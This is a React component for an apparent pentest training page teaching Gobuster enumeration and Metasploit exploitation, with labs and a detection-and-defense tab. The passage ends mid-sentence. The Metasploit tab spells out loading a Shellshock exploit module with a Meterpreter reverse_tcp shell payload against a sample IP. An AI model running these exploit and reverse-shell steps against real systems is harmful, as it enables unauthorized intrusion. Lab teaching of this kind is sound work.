// src/components/coach/GobusterMSFCoach.tsx
import { useState, useCallback, useEffect, useMemo, useRef } from 'react'
import {
  BookOpen, Terminal, Target, Copy, Play, Lightbulb,
  Shield, Zap, CheckCircle, AlertTriangle, Eye, Lock, GraduationCap,
  Menu, Search, ListChecks, RotateCcw} from 'lucide-react'

type Tab = 'overview' | 'gobuster' | 'metasploit' | 'workflows' | 'defense' | 'labs' | 'builder' | 'checklist'

const STORAGE_CHECKLIST = 'mentor_lab_checklist_v1'

export default function GobusterMSFCoach() {
  const [activeTab, setActiveTab] = useState<Tab>('overview')
  const [sidebarOpen, setSidebarOpen] = useState(false)
  const [search, setSearch] = useState('')
  const [checklist, setChecklist] = useState<Record<string, boolean>>(() => {
    try { return JSON.parse(localStorage.getItem(STORAGE_CHECKLIST) || '{}') } catch { return {} }
  })

  const [gobusterMode, setGobusterMode] = useState<'dir' | 'dns' | 'vhost' | 'fuzz'>('dir')
  const [gobusterUrl, setGobusterUrl] = useState('http://target.com')
  const [gobusterWordlist, setGobusterWordlist] = useState('/usr/share/wordlists/dirb/common.txt')
  const [gobusterThreads, setGobusterThreads] = useState(10)
  const [gobusterExtensions, setGobusterExtensions] = useState('php,html,txt')
  const [gobusterStatusCodes, setGobusterStatusCodes] = useState('200,204,301,302,307,401,403')
  const [gobusterExcludeLen, setGobusterExcludeLen] = useState('')
  const [gobusterFollowRedirect, setGobusterFollowRedirect] = useState(false)
  const [gobusterNoStatus, setGobusterNoStatus] = useState(false)
  const [gobusterOutput, setGobusterOutput] = useState('')
  const [copiedId, setCopiedId] = useState<string | null>(null)
  const copyTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null)

  // ─────────────────────────────────────────────────────────────────────────────
  // Copy with fallback for HTTP/non-secure contexts
  // ─────────────────────────────────────────────────────────────────────────────

  const copyToClipboard = useCallback((text: string, id: string) => {
    const mark = () => {
      if (copyTimerRef.current) clearTimeout(copyTimerRef.current)
      setCopiedId(id)
      copyTimerRef.current = setTimeout(() => setCopiedId(null), 1500)
    }
    const fallback = () => {
      try {
        const el = document.createElement('textarea')
        el.value = text
        el.style.position = 'fixed'
        el.style.opacity = '0'
        document.body.appendChild(el)
        el.select()
        document.execCommand('copy')
        document.body.removeChild(el)
        mark()
      } catch {
        console.debug('Clipboard fallback failed')
      }
    }
    if (navigator.clipboard?.writeText) {
      navigator.clipboard.writeText(text).then(mark, fallback)
    } else {
      fallback()
    }
  }, [])

  useEffect(() => () => { if (copyTimerRef.current) clearTimeout(copyTimerRef.current) }, [])
  useEffect(() => {
    try { localStorage.setItem(STORAGE_CHECKLIST, JSON.stringify(checklist)) } catch {}
  }, [checklist])
  useEffect(() => {
    if (!sidebarOpen) return
    const onKey = (e: KeyboardEvent) => { if (e.key === 'Escape') setSidebarOpen(false) }
    window.addEventListener('keydown', onKey)
    return () => window.removeEventListener('keydown', onKey)
  }, [sidebarOpen])

  // ─────────────────────────────────────────────────────────────────────────────
  // Command builder with fixes
  // ─────────────────────────────────────────────────────────────────────────────

  const generateGobusterCommand = useCallback(() => {
    const targetFlag = gobusterMode === 'dns' ? '-d' : '-u'
    let cmd = `gobuster ${gobusterMode} ${targetFlag} ${gobusterUrl.trim()} -w ${gobusterWordlist.trim()}`

    if (gobusterMode !== 'dns') {
      cmd += ` -t ${Math.max(1, Math.min(100, gobusterThreads))}`
    }

    if (gobusterMode === 'dir' && gobusterExtensions.trim()) {
      const cleaned = gobusterExtensions
        .split(',')
        .map(s => s.trim())
        .filter(Boolean)
        .join(',')
      if (cleaned) cmd += ` -x ${cleaned}`
    }
    if (gobusterMode === 'vhost') {
      cmd += ` --append-domain`
    }
    if (gobusterMode !== 'dns' && gobusterStatusCodes.trim()) {
      cmd += ` -s ${gobusterStatusCodes.split(',').map(s => s.trim()).filter(Boolean).join(',')}`
    }
    if (gobusterExcludeLen.trim()) {
      cmd += ` --exclude-length ${gobusterExcludeLen.trim()}`
    }
    if (gobusterFollowRedirect && gobusterMode !== 'dns') {
      cmd += ` -r`
    }
    if (gobusterNoStatus) {
      cmd += ` -n`
    }
    if (gobusterOutput.trim()) {
      cmd += ` -o ${gobusterOutput.trim()}`
    }
    return cmd
  }, [gobusterMode, gobusterUrl, gobusterWordlist, gobusterThreads, gobusterExtensions, gobusterStatusCodes, gobusterExcludeLen, gobusterFollowRedirect, gobusterNoStatus, gobusterOutput])

  // ─────────────────────────────────────────────────────────────────────────────
  // Auto-update target URL when mode changes
  // ─────────────────────────────────────────────────────────────────────────────

  useEffect(() => {
    setGobusterUrl(prev => {
      if (gobusterMode === 'dns') {
        const cleaned = prev.replace(/^https?:\/\//, '').replace(/\/.*$/, '')
        return cleaned || 'target.com'
      }
      if (gobusterMode === 'fuzz') {
        return prev.includes('FUZZ') ? prev : prev.replace(/\/?$/, '/FUZZ')
      }
      if (!/^https?:\/\//i.test(prev)) {
        return 'http://' + prev.replace(/^\/+/, '')
      }
      return prev
    })
  }, [gobusterMode])

  // ─────────────────────────────────────────────────────────────────────────────
  // Validate target for current mode
  // ─────────────────────────────────────────────────────────────────────────────

  const targetValidation = useMemo(() => {
    const value = gobusterUrl.trim()
    if (!value) return { valid: false, message: 'Target is required' }

    if (gobusterMode === 'dns') {
      if (/^https?:\/\//i.test(value)) {
        return { valid: false, message: 'DNS mode takes a bare domain, not a URL' }
      }
      if (!/^[a-z0-9.\-_]+$/i.test(value)) {
        return { valid: false, message: 'Invalid domain format' }
      }
      return { valid: true, message: '' }
    }

    if (!/^https?:\/\//i.test(value)) {
      return { valid: false, message: 'Must start with http:// or https://' }
    }
    if (gobusterMode === 'fuzz' && !value.includes('FUZZ')) {
      return { valid: false, message: 'Must include the literal FUZZ keyword' }
    }
    return { valid: true, message: '' }
  }, [gobusterUrl, gobusterMode])

  const tabs = [
    { id: 'overview' as const, label: 'Overview', icon: BookOpen },
    { id: 'gobuster' as const, label: 'Gobuster Deep Dive', icon: Target },
    { id: 'metasploit' as const, label: 'Metasploit Basics', icon: Terminal },
    { id: 'workflows' as const, label: 'Common Workflows', icon: Play },
    { id: 'defense' as const, label: 'Detection & Defense', icon: AlertTriangle },
    { id: 'labs' as const, label: 'Labs & Challenges', icon: GraduationCap },
    { id: 'builder' as const, label: 'Command Builder', icon: Lightbulb },
    { id: 'checklist' as const, label: 'Lab Checklist', icon: ListChecks },
  ]

  const checklistItems = useMemo(() => [
    { id: 'lab-vm', label: 'Stand up an authorized lab target', detail: 'Metasploitable2, DVWA, HTB, or THM box' },
    { id: 'nmap-first', label: 'Scan ports before web enum', detail: 'Know what is actually listening' },
    { id: 'gob-small', label: 'Gobuster dir with a small wordlist', detail: 'common.txt first — learn signal vs noise' },
    { id: 'gob-ext', label: 'Add -x for relevant extensions', detail: 'php/aspx/js as fits the stack' },
    { id: 'msf-search', label: 'Search Metasploit from a version string', detail: 'search + check before exploit' },
    { id: 'msf-session', label: 'Get a lab Meterpreter session', detail: 'sysinfo / getuid — understand the shell' },
    { id: 'ids-lab', label: 'Optional: watch IDS alerts once', detail: 'See what default noise looks like' },
  ], [])
  const checklistDone = checklistItems.filter(i => checklist[i.id]).length

  const setTab = (id: Tab) => {
    setActiveTab(id)
    setSidebarOpen(false)
  }

  // ─────────────────────────────────────────────────────────────────────────────
  // Reusable Copy Button Component
  // ─────────────────────────────────────────────────────────────────────────────

  const CopyButton = useCallback(({ text, id, className = '' }: { text: string; id: string; className?: string }) => {
    const isCopied = copiedId === id
    return (
      <button
        onClick={() => copyToClipboard(text, id)}
        className={`text-xs px-3 py-1 bg-white/5 hover:bg-white/10 rounded transition-colors flex items-center gap-1 text-white/40 hover:text-white/70 ${className}`}
        aria-label={isCopied ? 'Copied to clipboard' : 'Copy to clipboard'}
      >
        <Copy size={12} />
        {isCopied ? 'Copied!' : 'Copy'}
      </button>
    )
  }, [copiedId, copyToClipboard])

  return (
    <div className="min-h-full overflow-y-auto" style={{ background: 'linear-gradient(135deg, #090b14 0%, #0d1022 50%, #090b14 100%)' }}>
      <div className="max-w-6xl mx-auto p-6">
        
        {/* ── Header ── */}
        <div className="flex items-center justify-between mb-8">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-xl flex items-center justify-center" style={{ 
              background: 'radial-gradient(circle, rgba(139,92,246,0.2), rgba(139,92,246,0.05))', 
              border: '1px solid rgba(139,92,246,0.15)' 
            }}>
              <BookOpen size={18} className="text-purple-400" />
            </div>
            <div>
              <h1 className="text-white font-bold text-xl tracking-wide">MENTOR</h1>
              <p className="text-white/40 text-xs">Gobuster + Metasploit — enumeration to exploitation</p>
            </div>
          </div>
          
          <div className="flex items-center gap-2">
            <div className="relative hidden sm:block">
              <Search size={14} className="absolute left-3 top-1/2 -translate-y-1/2 text-white/30" />
              <input
                value={search}
                onChange={e => setSearch(e.target.value)}
                placeholder="Filter page…"
                className="pl-9 pr-3 py-2 w-44 bg-white/5 border border-white/10 rounded-xl text-xs text-white/80 placeholder-white/30 focus:outline-none focus:border-purple-500/40"
              />
            </div>
            <div className="hidden md:flex items-center gap-2 text-xs text-white/30">
              <Shield size={14} className="text-purple-400" />
              <span>lab guide</span>
            </div>
            <button
              type="button"
              onClick={() => setSidebarOpen(!sidebarOpen)}
              className="lg:hidden w-8 h-8 rounded-xl bg-white/5 border border-white/10 flex items-center justify-center text-white/40 hover:text-white/70 transition-colors"
              aria-label="Menu"
            >
              <Menu size={14} />
            </button>
          </div>
        </div>

        <div className="rounded-2xl border border-amber-500/30 p-3 flex gap-3 mb-4" style={{ background: 'rgba(251,191,36,0.06)' }}>
          <AlertTriangle className="text-amber-400 mt-0.5 flex-shrink-0" size={16} />
          <div className="text-xs text-amber-200/80">
            For authorized labs only (Metasploitable, DVWA, HTB, THM, your VMs). Lab Checklist: {checklistDone}/{checklistItems.length}.
          </div>
        </div>

        {sidebarOpen && (
          <div className="lg:hidden mb-4 rounded-xl border border-white/10 bg-black/40 p-2 space-y-1">
            {tabs.map(tab => {
              const Icon = tab.icon
              return (
                <button
                  key={tab.id}
                  type="button"
                  onClick={() => setTab(tab.id)}
                  className={`w-full flex items-center gap-2 px-3 py-2.5 rounded-lg text-sm ${
                    activeTab === tab.id ? 'bg-purple-500 text-white' : 'text-white/50 hover:bg-white/5'
                  }`}
                >
                  <Icon size={14} /> {tab.label}
                </button>
              )
            })}
          </div>
        )}

        {/* ── Tabs ── */}
        <div className="hidden lg:flex bg-white/5 rounded-xl p-1 border border-white/10 mb-6 overflow-x-auto">
          {tabs.map(tab => {
            const Icon = tab.icon
            return (
              <button
                key={tab.id}
                type="button"
                role="tab"
                aria-selected={activeTab === tab.id}
                onClick={() => setTab(tab.id)}
                className={`flex items-center gap-2 px-3 py-2 rounded-lg text-sm font-medium transition-all whitespace-nowrap ${
                  activeTab === tab.id
                    ? 'bg-purple-500 text-white'
                    : 'text-white/40 hover:text-white/70'
                }`}
              >
                <Icon size={14} />
                {tab.label}
              </button>
            )
          })}
        </div>

        {/* ── Content ── */}
        <div className="rounded-2xl border border-white/10 p-6" style={{ background: 'rgba(255,255,255,0.03)' }}>

          {/* ─── OVERVIEW ─── */}
          {activeTab === 'overview' && (
            <div className="space-y-6">
              <div>
                <h2 className="text-white font-semibold text-lg mb-2 text-purple-400">Why These Two Tools?</h2>
                <p className="text-white/50 leading-relaxed">
                  <strong className="text-white/70">Gobuster</strong> is one of the fastest and most reliable tools for directory, DNS, and virtual host enumeration.
                  <strong className="text-white/70 ml-1">Metasploit</strong> is the most powerful exploitation framework available.
                  Together they form the backbone of most web application and internal network attacks.
                </p>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="p-4 rounded-xl border border-white/10" style={{ background: 'rgba(255,255,255,0.03)' }}>
                  <h3 className="text-purple-400 font-semibold mb-2 flex items-center gap-2">
                    <Target size={16} /> Gobuster Strengths
                  </h3>
                  <ul className="text-sm space-y-1.5 text-white/50 list-disc pl-5">
                    <li>Extremely fast (written in Go)</li>
                    <li>Multiple modes: dir, dns, vhost, fuzz</li>
                    <li>Built-in wordlist support</li>
                    <li>Easy to script and automate</li>
                  </ul>
                </div>
                <div className="p-4 rounded-xl border border-white/10" style={{ background: 'rgba(255,255,255,0.03)' }}>
                  <h3 className="text-purple-400 font-semibold mb-2 flex items-center gap-2">
                    <Terminal size={16} /> Metasploit Strengths
                  </h3>
                  <ul className="text-sm space-y-1.5 text-white/50 list-disc pl-5">
                    <li>Huge database of exploits &amp; payloads</li>
                    <li>Excellent post-exploitation modules</li>
                    <li>Active community &amp; regular updates</li>
                    <li>Great for both beginners and experts</li>
                  </ul>
                </div>
              </div>

              <div className="p-4 rounded-xl border border-purple-500/20 flex gap-3" style={{ background: 'rgba(139,92,246,0.06)' }}>
                <Lightbulb className="text-purple-400 flex-shrink-0 mt-0.5" size={18} />
                <div className="text-sm text-white/50">
                  <strong className="text-white/70">Pro Tip:</strong> Combine both tools in a single engagement – use Gobuster to find entry points, then use Metasploit to exploit them.
                </div>
              </div>
            </div>
          )}

          {/* ─── GOBUSTER ─── */}
          {activeTab === 'gobuster' && (
            <div className="space-y-6">
              <h2 className="text-white font-semibold text-lg text-purple-400">Gobuster Modes Explained</h2>

              <div className="space-y-4">
                <div className="p-4 rounded-xl border border-white/10" style={{ background: 'rgba(255,255,255,0.03)' }}>
                  <h3 className="text-purple-400 font-semibold mb-2">1. Directory Enumeration (dir)</h3>
                  <p className="text-sm text-white/50 mb-2">Most commonly used mode. Brute-forces directories and files on web servers.</p>
                  <div className="bg-black/60 rounded-lg p-3 font-mono text-sm flex flex-wrap items-center justify-between gap-2">
                    <span className="text-emerald-400 break-all">gobuster dir -u http://target.com -w /path/to/wordlist.txt</span>
                    <CopyButton text="gobuster dir -u http://target.com -w /path/to/wordlist.txt" id="gobuster-dir" />
                  </div>
                  <div className="mt-2 text-xs text-white/30">
                    <span className="text-purple-400">Flags:</span> <code className="bg-white/5 px-1.5 py-0.5 rounded">-t</code> threads, <code className="bg-white/5 px-1.5 py-0.5 rounded">-x</code> extensions
                  </div>
                </div>

                <div className="p-4 rounded-xl border border-white/10" style={{ background: 'rgba(255,255,255,0.03)' }}>
                  <h3 className="text-purple-400 font-semibold mb-2">2. DNS Subdomain Enumeration (dns)</h3>
                  <p className="text-sm text-white/50 mb-2">Finds subdomains by brute-forcing DNS records.</p>
                  <div className="bg-black/60 rounded-lg p-3 font-mono text-sm flex flex-wrap items-center justify-between gap-2">
                    <span className="text-emerald-400 break-all">gobuster dns -d target.com -w subdomains.txt</span>
                    <CopyButton text="gobuster dns -d target.com -w subdomains.txt" id="gobuster-dns" />
                  </div>
                  <div className="mt-2 text-xs text-white/30">
                    <span className="text-purple-400">Note:</span> DNS mode uses <code className="bg-white/5 px-1.5 py-0.5 rounded">-d</code> (domain) not <code className="bg-white/5 px-1.5 py-0.5 rounded">-u</code> (URL), and does <em>not</em> accept the <code className="bg-white/5 px-1.5 py-0.5 rounded">-t</code> flag.
                  </div>
                </div>

                <div className="p-4 rounded-xl border border-white/10" style={{ background: 'rgba(255,255,255,0.03)' }}>
                  <h3 className="text-purple-400 font-semibold mb-2">3. Virtual Host Enumeration (vhost)</h3>
                  <p className="text-sm text-white/50 mb-2">Useful when the target uses virtual hosting.</p>
                  <div className="bg-black/60 rounded-lg p-3 font-mono text-sm flex flex-wrap items-center justify-between gap-2">
                    <span className="text-emerald-400 break-all">gobuster vhost -u http://target.com -w vhosts.txt --append-domain</span>
                    <CopyButton text="gobuster vhost -u http://target.com -w vhosts.txt --append-domain" id="gobuster-vhost" />
                  </div>
                </div>

                <div className="p-4 rounded-xl border border-white/10" style={{ background: 'rgba(255,255,255,0.03)' }}>
                  <h3 className="text-purple-400 font-semibold mb-2">4. Fuzzing (fuzz)</h3>
                  <p className="text-sm text-white/50 mb-2">Replace FUZZ keyword in URL with wordlist entries.</p>
                  <div className="bg-black/60 rounded-lg p-3 font-mono text-sm flex flex-wrap items-center justify-between gap-2">
                    <span className="text-emerald-400 break-all">gobuster fuzz -u http://target.com/FUZZ -w fuzz.txt</span>
                    <CopyButton text="gobuster fuzz -u http://target.com/FUZZ -w fuzz.txt" id="gobuster-fuzz" />
                  </div>
                </div>
              </div>

              <div className="p-4 rounded-xl border border-white/10" style={{ background: 'rgba(255,255,255,0.03)' }}>
                <h3 className="text-white font-semibold mb-2 flex items-center gap-2">
                  <Zap size={16} className="text-purple-400" /> Pro Tips
                </h3>
                <ul className="text-sm space-y-2 text-white/50">
                  <li>• Always use <code className="bg-white/10 px-1.5 py-0.5 rounded text-emerald-400">-t</code> (threads) — start with 10-30</li>
                  <li>• Use <code className="bg-white/10 px-1.5 py-0.5 rounded text-emerald-400">-x</code> to look for specific extensions (php,asp,aspx,js,html)</li>
                  <li>• Combine with <code className="bg-white/10 px-1.5 py-0.5 rounded text-emerald-400">--wildcard</code> when dealing with catch-all DNS</li>
                  <li>• Use <code className="bg-white/10 px-1.5 py-0.5 rounded text-emerald-400">-k</code> to ignore SSL certificate errors</li>
                  <li>• For vhost, <code className="bg-white/10 px-1.5 py-0.5 rounded text-emerald-400">--append-domain</code> is essential</li>
                  <li>• Use <code className="bg-white/10 px-1.5 py-0.5 rounded text-emerald-400">-s</code> to only show interesting status codes</li>
                  <li>• <code className="bg-white/10 px-1.5 py-0.5 rounded text-emerald-400">--exclude-length</code> kills wildcard/soft-404 noise</li>
                  <li>• Start small wordlists; scale up after you know the response shape</li>
                </ul>
              </div>
            </div>
          )}

          {/* ─── METASPLOIT ─── */}
          {activeTab === 'metasploit' && (
            <div className="space-y-6">
              <h2 className="text-white font-semibold text-lg text-purple-400">Metasploit Workflow</h2>

              <div className="space-y-4">
                <div className="p-4 rounded-xl border border-white/10" style={{ background: 'rgba(255,255,255,0.03)' }}>
                  <div className="text-purple-400 font-semibold mb-1 flex items-center gap-2">
                    <span className="bg-purple-500/20 px-2 py-0.5 rounded text-xs">Step 1</span>
                    Start msfconsole
                  </div>
                  <div className="bg-black/60 rounded-lg p-3 font-mono text-sm flex items-center justify-between">
                    <span className="text-emerald-400">msfconsole</span>
                    <CopyButton text="msfconsole" id="msf-step1" />
                  </div>
                </div>

                <div className="p-4 rounded-xl border border-white/10" style={{ background: 'rgba(255,255,255,0.03)' }}>
                  <div className="text-purple-400 font-semibold mb-1 flex items-center gap-2">
                    <span className="bg-purple-500/20 px-2 py-0.5 rounded text-xs">Step 2</span>
                    Search for exploits
                  </div>
                  <div className="bg-black/60 rounded-lg p-3 font-mono text-sm flex items-center justify-between">
                    <span className="text-emerald-400">search type:exploit platform:linux</span>
                    <CopyButton text="search type:exploit platform:linux" id="msf-step2" />
                  </div>
                  <div className="mt-1 text-xs text-white/30">
                    Use filters: <code className="bg-white/5 px-1.5 py-0.5 rounded">type:exploit</code>, <code className="bg-white/5 px-1.5 py-0.5 rounded">platform:linux</code>, <code className="bg-white/5 px-1.5 py-0.5 rounded">cve:2021</code>
                  </div>
                </div>

                <div className="p-4 rounded-xl border border-white/10" style={{ background: 'rgba(255,255,255,0.03)' }}>
                  <div className="text-purple-400 font-semibold mb-1 flex items-center gap-2">
                    <span className="bg-purple-500/20 px-2 py-0.5 rounded text-xs">Step 3</span>
                    Use a module
                  </div>
                  <div className="bg-black/60 rounded-lg p-3 font-mono text-sm flex items-center justify-between">
                    <span className="text-emerald-400">use exploit/multi/http/apache_mod_cgi_bash_env_exec</span>
                    <CopyButton text="use exploit/multi/http/apache_mod_cgi_bash_env_exec" id="msf-step3" />
                  </div>
                </div>

                <div className="p-4 rounded-xl border border-white/10" style={{ background: 'rgba(255,255,255,0.03)' }}>
                  <div className="text-purple-400 font-semibold mb-1 flex items-center gap-2">
                    <span className="bg-purple-500/20 px-2 py-0.5 rounded text-xs">Step 4</span>
                    Set options &amp; run
                  </div>
                  <div className="bg-black/60 rounded-lg p-3 font-mono text-sm space-y-1">
                    <div className="text-emerald-400">set RHOSTS 10.10.10.50</div>
                    <div className="text-emerald-400">set PAYLOAD linux/x64/meterpreter/reverse_tcp</div>
                    <div className="text-emerald-400">exploit</div>
                  </div>
                  <CopyButton
                    text="set RHOSTS 10.10.10.50\nset PAYLOAD linux/x64/meterpreter/reverse_tcp\nexploit"
                    id="msf-step4"
                    className="mt-2"
                  />
                  <div className="mt-1 text-xs text-white/30">
                    Always check <code className="bg-white/5 px-1.5 py-0.5 rounded">show options</code> and <code className="bg-white/5 px-1.5 py-0.5 rounded">show advanced</code>
                  </div>
                </div>
              </div>

              <div className="p-4 rounded-xl border border-purple-500/20 flex gap-3" style={{ background: 'rgba(139,92,246,0.06)' }}>
                <AlertTriangle className="text-purple-400 flex-shrink-0 mt-0.5" size={18} />
                <div className="text-sm text-white/50">
                  <strong className="text-white/70">Remember:</strong> Always use <code className="bg-white/10 px-1.5 py-0.5 rounded text-emerald-400">check</code> before running <code className="bg-white/10 px-1.5 py-0.5 rounded text-emerald-400">exploit</code> to verify if the target is vulnerable.
                </div>
              </div>
            </div>
          )}

          {/* ─── WORKFLOWS ─── */}
          {activeTab === 'workflows' && (
            <div className="space-y-6">
              <h2 className="text-white font-semibold text-lg text-purple-400">Typical Attack Chains</h2>

              <div className="space-y-4">
                <div className="p-4 rounded-xl border border-white/10" style={{ background: 'rgba(255,255,255,0.03)' }}>
                  <div className="text-white font-semibold flex items-center gap-2">
                    <span className="bg-purple-500/20 px-2 py-0.5 rounded text-xs text-purple-400">Chain 1</span>
                    Web Enumeration → Exploitation
                  </div>
                  <div className="text-sm text-white/50 mt-2">
                    <ol className="list-decimal list-inside space-y-1">
                      <li>Use <strong className="text-white/70">Gobuster dir</strong> to find hidden directories/admin panels</li>
                      <li>Identify a vulnerable service (e.g., Apache Struts, WordPress plugin)</li>
                      <li>Switch to <strong className="text-white/70">Metasploit</strong> to exploit the discovered service</li>
                      <li>Use <code className="bg-white/5 px-1.5 py-0.5 rounded text-emerald-400">search</code> and <code className="bg-white/5 px-1.5 py-0.5 rounded text-emerald-400">use</code> to find the right exploit</li>
                    </ol>
                  </div>
                </div>

                <div className="p-4 rounded-xl border border-white/10" style={{ background: 'rgba(255,255,255,0.03)' }}>
                  <div className="text-white font-semibold flex items-center gap-2">
                    <span className="bg-purple-500/20 px-2 py-0.5 rounded text-xs text-purple-400">Chain 2</span>
                    Subdomain Takeover / Virtual Host Discovery
                  </div>
                  <div className="text-sm text-white/50 mt-2">
                    <ol className="list-decimal list-inside space-y-1">
                      <li>Use <strong className="text-white/70">Gobuster dns</strong> or <strong className="text-white/70">vhost</strong> to find subdomains</li>
                      <li>Identify interesting subdomains (e.g., admin, dev, staging)</li>
                      <li>Pivot into <strong className="text-white/70">Metasploit</strong> for further exploitation</li>
                      <li>Use auxiliary/scanner modules to gather more info</li>
                    </ol>
                  </div>
                </div>

                <div className="p-4 rounded-xl border border-white/10" style={{ background: 'rgba(255,255,255,0.03)' }}>
                  <div className="text-white font-semibold flex items-center gap-2">
                    <span className="bg-purple-500/20 px-2 py-0.5 rounded text-xs text-purple-400">Chain 3</span>
                    API Fuzzing → Privilege Escalation
                  </div>
                  <div className="text-sm text-white/50 mt-2">
                    <ol className="list-decimal list-inside space-y-1">
                      <li>Use <strong className="text-white/70">Gobuster fuzz</strong> to discover hidden API endpoints</li>
                      <li>Find parameters that are vulnerable to injection (SQLi, LFI, etc.)</li>
                      <li>Use <strong className="text-white/70">Metasploit</strong> to exploit the vulnerability</li>
                      <li>Post-exploit with <code className="bg-white/5 px-1.5 py-0.5 rounded text-emerald-400">meterpreter</code> or <code className="bg-white/5 px-1.5 py-0.5 rounded text-emerald-400">shell</code></li>
                    </ol>
                  </div>
                </div>
              </div>

              <div className="p-4 rounded-xl border border-white/10" style={{ background: 'rgba(255,255,255,0.03)' }}>
                <h3 className="text-white font-semibold flex items-center gap-2">
                  <CheckCircle size={16} className="text-purple-400" /> Best Practices
                </h3>
                <ul className="text-sm text-white/50 space-y-1 list-disc pl-5 mt-2">
                  <li>Always start with <strong className="text-white/70">enumeration</strong> (Gobuster) before exploitation</li>
                  <li>Use <strong className="text-white/70">Metasploit</strong> for reliable exploits</li>
                  <li>Keep wordlists updated (SecLists, rockyou, etc.)</li>
                  <li>Document your findings for reports</li>
                </ul>
              </div>
            </div>
          )}

          {/* ─── DETECTION & DEFENSE ─── */}
          {activeTab === 'defense' && (
            <div className="space-y-6">
              <h2 className="text-white font-semibold text-lg text-purple-400">Detection & Defense</h2>
              <p className="text-sm text-white/50">
                Every tool leaves a footprint. If you don't know what that footprint looks like, you can't
                plan around it — and you won't recognize it when a defender is looking at the same logs you're generating.
              </p>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="p-4 rounded-xl border border-white/10" style={{ background: 'rgba(255,255,255,0.03)' }}>
                  <h3 className="text-white font-semibold mb-2 flex items-center gap-2">
                    <Eye size={16} className="text-purple-400" /> Gobuster: How It Gets Noticed
                  </h3>
                  <ul className="text-sm space-y-1.5 text-white/50 list-disc pl-5">
                    <li>Gobuster generates a huge volume of HTTP requests from one source IP in a short window — trivially flagged by rate-based WAF rules.</li>
                    <li>A wordlist scan produces a distinctive pattern of mostly-404 responses interrupted by occasional 200/301/403 — this shape is easy to fingerprint even without signature matching.</li>
                    <li>Default User-Agent strings (or obviously scripted ones) stand out in access logs next to normal browser traffic.</li>
                    <li>DNS mode floods the resolver with queries for random-looking subdomains — visible in DNS query logs or a passive DNS monitor.</li>
                  </ul>
                </div>
                <div className="p-4 rounded-xl border border-white/10" style={{ background: 'rgba(255,255,255,0.03)' }}>
                  <h3 className="text-white font-semibold mb-2 flex items-center gap-2">
                    <Lock size={16} className="text-purple-400" /> Gobuster: Defensive Controls
                  </h3>
                  <ul className="text-sm space-y-1.5 text-white/50 list-disc pl-5">
                    <li>Rate limiting / connection throttling per source IP at the WAF or reverse proxy.</li>
                    <li>Custom error pages that don't leak directory structure, combined with consistent 404 responses (no different behavior for real vs fake paths).</li>
                    <li>Web Application Firewalls (WAFs) with brute-force/enumeration rulesets (e.g. ModSecurity CRS).</li>
                    <li>Alerting on abnormal 404 volume or request-rate spikes in centralized logging (SIEM).</li>
                  </ul>
                </div>
                <div className="p-4 rounded-xl border border-white/10" style={{ background: 'rgba(255,255,255,0.03)' }}>
                  <h3 className="text-white font-semibold mb-2 flex items-center gap-2">
                    <Eye size={16} className="text-purple-400" /> Metasploit: How It Gets Noticed
                  </h3>
                  <ul className="text-sm space-y-1.5 text-white/50 list-disc pl-5">
                    <li>Default Metasploit payloads (especially unencoded Meterpreter) match known signatures in most AV/EDR products — this is the single biggest reason "textbook" Metasploit gets caught immediately in a real environment.</li>
                    <li>Meterpreter's default reverse_tcp handshake and check-in traffic has a recognizable pattern that network IDS (Suricata/Snort) rulesets detect out of the box.</li>
                    <li>Exploit modules often hit a specific vulnerable endpoint with a distinctive payload — this shows up clearly in web server or application logs.</li>
                    <li>Process injection and typical post-exploitation modules (hashdump, mimikatz) trigger EDR behavioral alerts, not just signature matches.</li>
                  </ul>
                </div>
                <div className="p-4 rounded-xl border border-white/10" style={{ background: 'rgba(255,255,255,0.03)' }}>
                  <h3 className="text-white font-semibold mb-2 flex items-center gap-2">
                    <Lock size={16} className="text-purple-400" /> Metasploit: Defensive Controls
                  </h3>
                  <ul className="text-sm space-y-1.5 text-white/50 list-disc pl-5">
                    <li>Patch management — most Metasploit exploit modules target known, disclosed CVEs; timely patching removes the exploit entirely rather than just detecting it.</li>
                    <li>EDR/AV with behavioral detection, not just signatures, since payloads can be encoded or custom-built.</li>
                    <li>Network IDS/IPS with up-to-date rulesets for known exploit and C2 traffic patterns.</li>
                    <li>Egress filtering — block or tightly control outbound connections so a reverse shell has nowhere to call back to.</li>
                    <li>Application allow-listing to stop dropped binaries or injected processes from executing.</li>
                  </ul>
                </div>
              </div>

              <div className="p-4 rounded-xl border border-purple-500/20 flex gap-3" style={{ background: 'rgba(139,92,246,0.06)' }}>
                <AlertTriangle className="text-purple-400 flex-shrink-0 mt-0.5" size={18} />
                <div className="text-sm text-white/50">
                  <strong className="text-white/70">Key point:</strong> detection isn't just "the tool got flagged" — it's a spectrum.
                  A quiet, slow, correctly-scoped Gobuster scan against a known-authorized target and a loud 100-thread scan against
                  a production WAF produce very different amounts of noise. Same tool, same technique, very different risk of getting
                  caught mid-engagement. Tuning threads, wordlist size, and timing is part of the skill, not an afterthought.
                </div>
              </div>
            </div>
          )}

          {/* ─── LABS & CHALLENGES ─── */}
          {activeTab === 'labs' && (
            <div className="space-y-6">
              <h2 className="text-white font-semibold text-lg text-purple-400">Labs & Challenges</h2>
              <p className="text-sm text-white/50">
                Don't just read these — do them, in a real VM, against a real target you're authorized to attack
                (Metasploitable2, DVWA, or a HackTheBox/TryHackMe box). Then answer the check-yourself questions
                without looking anything up. If you can't answer one, that's the topic to go re-study — not a
                reason to move on.
              </p>

              <div className="space-y-4">
                <div className="p-4 rounded-xl border border-white/10" style={{ background: 'rgba(255,255,255,0.03)' }}>
                  <div className="text-white font-semibold flex items-center gap-2">
                    <span className="bg-purple-500/20 px-2 py-0.5 rounded text-xs text-purple-400">Lab 1</span>
                    Directory Enumeration From Scratch
                  </div>
                  <ol className="text-sm text-white/50 list-decimal list-inside space-y-1 mt-2">
                    <li>Spin up Metasploitable2 or DVWA locally.</li>
                    <li>Run an nmap scan first to confirm which ports/services are actually up before you enumerate anything.</li>
                    <li>Run Gobuster in <code className="bg-white/5 px-1.5 py-0.5 rounded text-emerald-400">dir</code> mode against the web service using a small wordlist first (e.g. common.txt), then a larger one.</li>
                    <li>Compare the results and the time taken. Explain why the bigger wordlist found more (or didn't).</li>
                  </ol>
                  <p className="text-xs text-white/30 mt-2">
                    <strong className="text-white/70">Check yourself:</strong> what HTTP status code would a hidden-but-existing
